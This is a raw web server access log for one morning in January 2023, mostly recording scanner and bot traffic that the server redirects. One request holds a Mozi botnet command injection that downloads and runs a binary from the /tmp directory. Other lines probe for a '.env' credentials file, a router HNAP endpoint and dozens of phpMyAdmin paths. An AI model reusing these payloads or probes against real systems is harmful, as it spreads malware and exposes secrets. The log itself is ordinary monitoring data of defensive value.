184.105.247.195 - - [22/Jan/2023:03:17:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
143.110.184.142 - - [22/Jan/2023:03:17:06 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
184.105.247.195 - - [22/Jan/2023:03:18:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0"
184.105.247.195 - - [22/Jan/2023:03:19:01 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15"
179.43.177.242 - - [22/Jan/2023:03:38:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
185.224.128.215 - - [22/Jan/2023:03:58:42 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
185.224.128.215 - - [22/Jan/2023:03:58:46 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
143.110.222.166 - - [22/Jan/2023:04:12:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
15.235.50.169 - - [22/Jan/2023:04:16:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37"
120.85.114.208 - - [22/Jan/2023:04:47:17 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 324 "-" "Hello, world"
143.110.222.166 - - [22/Jan/2023:05:07:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [22/Jan/2023:05:24:37 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:05:24:37 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
79.127.61.250 - - [22/Jan/2023:05:30:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.32.162.159 - - [22/Jan/2023:05:44:25 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
151.247.182.209 - - [22/Jan/2023:05:48:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
114.107.225.150 - - [22/Jan/2023:05:48:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [22/Jan/2023:06:10:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [22/Jan/2023:06:25:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.138.120 - - [22/Jan/2023:06:32:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.120 - - [22/Jan/2023:06:32:13 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
198.235.24.13 - - [22/Jan/2023:06:32:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
179.43.177.242 - - [22/Jan/2023:06:37:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
78.83.217.220 - - [22/Jan/2023:06:54:06 -0600] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:06 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:06 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:06 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:07 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:08 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:08 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:08 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:08 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:08 -0600] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:08 -0600] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:09 -0600] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:09 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:09 -0600] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:09 -0600] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:09 -0600] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:09 -0600] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:10 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:11 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:11 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:11 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:11 -0600] "GET /db/webdb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:11 -0600] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:11 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:12 -0600] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:13 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:13 -0600] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:13 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:13 -0600] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:13 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:13 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:14 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:14 -0600] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:14 -0600] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:14 -0600] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:14 -0600] "GET /admin/db/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:14 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /phppma/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:15 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:16 -0600] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:16 -0600] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:16 -0600] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:16 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:16 -0600] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:16 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:17 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:18 -0600] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:18 -0600] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:18 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:18 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:18 -0600] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:18 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:19 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:19 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:19 -0600] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:19 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:19 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
